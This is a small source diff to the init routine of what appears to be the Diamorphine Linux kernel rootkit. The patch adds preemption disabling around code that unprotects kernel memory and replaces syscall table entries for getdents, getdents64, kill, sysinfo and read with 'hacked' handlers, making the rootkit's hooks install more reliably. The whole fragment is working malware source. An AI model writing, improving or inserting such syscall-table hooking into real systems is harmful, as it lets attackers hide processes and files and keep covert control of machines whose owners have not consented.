@@ -351,7 +351,8 @@ diamorphine_init(void)
 	orig_kill = (orig_kill_t)__sys_call_table[__NR_kill];
 	orig_sysinfo = (orig_sysinfo_t)__sys_call_table[__NR_sysinfo];
 	orig_read = (orig_read_t)__sys_call_table[__NR_read];
-
+	
+	preempt_disable();
 	unprotect_memory();
 	__sys_call_table[__NR_getdents] = (unsigned long)hacked_getdents;
 	__sys_call_table[__NR_getdents64] = (unsigned long)hacked_getdents64;
@@ -359,6 +360,7 @@ diamorphine_init(void)
 	__sys_call_table[__NR_sysinfo] = (unsigned long)hacked_sysinfo;
 	__sys_call_table[__NR_read] = (unsigned long)hacked_read;
 	protect_memory();
+	preempt_enable();
 
 	return 0;
 }
